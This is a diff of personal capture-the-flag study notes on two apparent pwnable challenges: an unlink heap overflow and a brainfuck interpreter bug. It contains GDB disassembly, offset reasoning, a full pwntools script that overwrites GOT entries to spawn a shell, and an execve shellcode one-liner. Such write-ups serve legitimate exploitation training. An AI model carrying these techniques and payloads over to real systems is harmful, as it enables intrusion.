@@ -806,86 +806,81 @@ I found a really convenient way to send shellcode online. Obviously I'm keeping 
 -----------------------------------------
 unlink
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-typedef struct tagOBJ{
-   struct tagOBJ* fd;
-   struct tagOBJ* bk;
-   char buf[8];
-}OBJ;
+So, for this particular challenge, what I did continually put in input and observe the results from the program (all in assembly/GDB of course). The first thing I did was send in a string like "AAAABBBBCCCCDDDDEEEEFFFFGGGG". 
 
-void shell(){
-   system("/bin/sh");
-}
+THe unlink method is obviously of the most interest, so I took a look at the assembly there. There, the assembly attempted to store the value of FFFF into the memory at EEEE and the value of EEEE at the memory of FFFF. I first attempted to overwrite the next instruction address with the memory address of the shell function conveniently given, but nothing happened. SO, I need to try something else.
 
-void unlink(OBJ* P){
-   OBJ* BK;
-   OBJ* FD;
-   BK=P->bk;
-   FD=P->fd;
-   FD->bk=BK;
-   BK->fd=FD;
-}
-int main(int argc, char* argv[]){
-   malloc(1024);
-   OBJ* A = (OBJ*)malloc(sizeof(OBJ));
-   OBJ* B = (OBJ*)malloc(sizeof(OBJ));
-   OBJ* C = (OBJ*)malloc(sizeof(OBJ));
+Going on, I notice something interesting in the code AFTER the method has been returned. Namely, this: 
 
-   // double linked list: A <-> B <-> C
-   A->fd = B;
-   B->bk = A;
-   B->fd = C;
-   C->bk = B;
+   0x80485f7 <main+200>:   add    esp,0x10
+=> 0x80485fa <main+203>:   mov    eax,0x0
+   0x80485ff <main+208>:   mov    ecx,DWORD PTR [ebp-0x4]
+   0x8048602 <main+211>:   leave  
+   0x8048603 <main+212>:   lea    esp,[ecx-0x4]
 
-   printf("here is stack address leak: %p\n", &A);
-   printf("here is heap address leak: %p\n", A);
-   printf("now that you have leaks, get shell!\n");
-   // heap overflow!
-   gets(A->buf);
+The lea is particularly relevant, and even more so when you take a closer look at the unlink disassembly.
 
-   // exploit this unlink!
-   unlink(B);
-   return 0;
-}
+   0x08048504 <+0>:  push   ebp
+   0x08048505 <+1>:  mov    ebp,esp
+   0x08048507 <+3>:  sub    esp,0x10
+   0x0804850a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
+   0x0804850d <+9>:  mov    eax,DWORD PTR [eax+0x4]
+   0x08048510 <+12>: mov    DWORD PTR [ebp-0x4],eax
+   0x08048513 <+15>: mov    eax,DWORD PTR [ebp+0x8]
+   0x08048516 <+18>: mov    eax,DWORD PTR [eax]
+   0x08048518 <+20>: mov    DWORD PTR [ebp-0x8],eax
+   0x0804851b <+23>: mov    eax,DWORD PTR [ebp-0x8]
+   0x0804851e <+26>: mov    edx,DWORD PTR [ebp-0x4]
+   0x08048521 <+29>: mov    DWORD PTR [eax+0x4],edx
+   0x08048524 <+32>: mov    eax,DWORD PTR [ebp-0x4]
+   0x08048527 <+35>: mov    edx,DWORD PTR [ebp-0x8]
+   0x0804852a <+38>: mov    DWORD PTR [eax],edx
+   0x0804852c <+40>: nop
+   0x0804852d <+41>: leave  
+   0x0804852e <+42>: ret    
 
-=> 0x8048521 <unlink+29>:  mov    DWORD PTR [eax+0x4],edx
+Essentially, this method is doing this:
+$ebp-0x4 = FFFF
+$ebp-0x8 = EEEE
 
-Program's segfaulting here after flooding it with AAAAAA input.
-It's trying to store the value of edx ("AAAA") into memory address (0x41414141 + 4).
-Obviously, there's a lot of potential here... I just need to figure out how to control it.
+eax = EEEE
+edx = FFFF
+$eax = edx
+eax = FFFF
+edx = EEEE
+$eax = edx
 
-So I send it
-AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+The relevant part is that $ebp-0x4 is controlled by me, and is currently FFFF in this session. Great! However, I need to take into account this:
 
-gdb-peda$ x/x $eax+0x4
-0x45454549: Cannot access memory at address 0x45454549
-gdb-peda$ info registers
-eax            0x45454545  0x45454545
-ecx            0xfbad2288  0xfbad2288
-edx            0x46464646  0x46464646
-ebx            0x0   0x0
-esp            0xbfeb8a28  0xbfeb8a28
-ebp            0xbfeb8a38  0xbfeb8a38
-esi            0x1   0x1
-edi            0xb76ea000  0xb76ea000
-eip            0x8048521   0x8048521 <unlink+29>
-eflags         0x286 [ PF SF IF ]
-cs             0x73  0x73
-ss             0x7b  0x7b
-ds             0x7b  0x7b
-es             0x7b  0x7b
-fs             0x0   0x0
-gs             0x33  0x33
+   0x0804852d <+41>: leave  
 
-Now I can see that it's trying to store 0x46464646 (FFFF) into $0x45454549 (EEEE + 0x4). 
+This alters my base pointer by changing it back to what it was before (but luckily I can see using GDB)
 
-python -c 'print "AAAA" * 4 + "\x28\x85\x04\x08" + "\xeb\x84\x04\x08"'
+('STACK: ', '0xbfdedea4', ' HEAP: ', '0x88b1410')
 
-python -c 'print "AAAA" * 4 + "\x74\x4f\xfd\xbf" + "AAAA"'
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xfbad2088 
+EDX: 0x88b141c ("AAAA\264\336\336\277CCCC\034\024\213\b\264\336\336\277c")
+ESI: 0x1 
+EDI: 0xb7754000 --> 0x1b2db0 
+EBP: 0xbfdedeb8 --> 0x0 
+ESP: 0xbfdedea0 --> 0x1 
+EIP: 0x80485ff (<main+208>:   mov    ecx,DWORD PTR [ebp-0x4])
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
 
-Don't forget to add 4....
+What the above essentially shows is that ebp has a 20 byte difference from the start of the stack leak, which when subtracted by 4, gives a 16 byte offset between the two.
+
+So I need to use the stack address + 0x10.
+Then, in <main+212>, my value (currently FFFF) is subtracted by 4 and the memory at that location is loaded as the next instruction.
+
+So what I need to do is have the memory address of shell in my input, and then I replace FFFF with the memory address of that memory address + 4. In this case, since the heap data begins 8 bytes after the heap address leak, it would be an offset of (8 + 4 = c).
+
+So I would use heap + 0xc.
+
+The exact python script I used should be called unlink.py.
 
 Tips: 
 Start up GDB
@@ -894,3 +889,74 @@ make sure to include connection.interactive()
 locate the PID stated in the script output
 use GDB to type 'attach PID' (obv replace PID)
 then you can use GDB as usual (you may have to type c in both terminals)
+
+new one? Look for one on ports and networks.
+
+
+-----------------------------------------
+bf
+
+So, I actually had a lot of trouble with this one. So I looked up a solution and instead spent some time analyzing it. (Thank God I actually learned something from it or else this would've just been a case of laziness).
+
+So, for this challenge, you essentially need to use brainfuck instructions with the exceptions of [ ], which creates a loop
+
+(Below ripped right from Wikipedia)
+Character   Meaning 
+>           increment the data pointer (to point to the next cell to the right).
+<           decrement the data pointer (to point to the next cell to the left).
++           increment (increase by one) the byte at the data pointer.
+-           decrement (decrease by one) the byte at the data pointer.
+.           output the byte at the data pointer.
+,           accept one byte of input, storing its value in the byte at the data pointer.
+
+The bug that this program has is that it allows you to decrement to a negative position in the brainfuck array. When you look at the other instructions, this reveals that you have the capability to read and write from memory. However, the range you can actually act in is quite limited. My initial plan was to decrement the data pointer until I reached a GOT function's address so I could override it with the address of my shellcode. 
+
+However, brainfuck's limitation only allows me to use pre-existing code, or else it segfaults (NX is activated). So this means that I need to override the GOT function with another function more useful to me. Since there isn't a give_shell function or anything, I need to somehow enter the string "/bin/sh\x00" and call system with that as its parameter.
+
+So, looking through the disassembly, I spot two function calls very close to each other in main:
+
+   0x08048717 <+166>:   call   0x80484c0 <memset@plt>
+   0x0804871c <+171>:   mov    eax,ds:0x804a040
+   0x08048721 <+176>:   mov    DWORD PTR [esp+0x8],eax
+   0x08048725 <+180>:   mov    DWORD PTR [esp+0x4],0x400
+   0x0804872d <+188>:   lea    eax,[esp+0x2c]
+   0x08048731 <+192>:   mov    DWORD PTR [esp],eax
+   0x08048734 <+195>:   call   0x8048450 <fgets@plt>
+
+If I override memset with gets and fgets with system, I can input /bin/sh into a system call. 
+
+from pwn import *
+
+p = process('./bf')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+p.recvline_startswith('type')
+p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
+p.recv(1)
+x=p.recv(4)[::-1]
+
+jump=0x080484E0
+p.send(p32(jump))
+
+system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
+gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']
+
+print(x.encode('hex'))
+print(hex(system))
+p.send(p32(system))
+p.send(p32(gets))
+p.sendline('/bin/sh\x00')
+p.interactive()
+
+p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.') is perhaps the most important line.
+The first 112 '<' is to go back 112 spots from the initial memory location of the array to get to the function address of putchar so it can be overriden with (in this case) the _start function in c, which essentially just warps you back to the start of main. 
+
+The next '.' is to initialize the function putchar so that it's address can be locked (it's randomized each time the program is run), while the next '.>' * 4 is to output the randomized location where putchar is at. This is so calculations can be made and offsets can be applied in order to find the locations of other GOT functions. 
+
+The next '<' * (4 + 32) moves you back to override fgets (0x804a030 - 32 = 0x804a010, which is fgets location) with the value that allows you to call system. The rest of the code is just overriding memset with gets, and a final '.' which calls putchar (which now is _start) and then consequently calls memset and fgets to create a shell for you.
+
+
+Tips: When given a libc or NX is on, consider the approach in which you override functions to get a shell
+
+$(python -c 'print "<" * 112 + "." + ",>" * 4 + ".\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n" + "\xfe\xef\xff\xbf"')
+
+Above is my code that would probably work is NX was disabled.
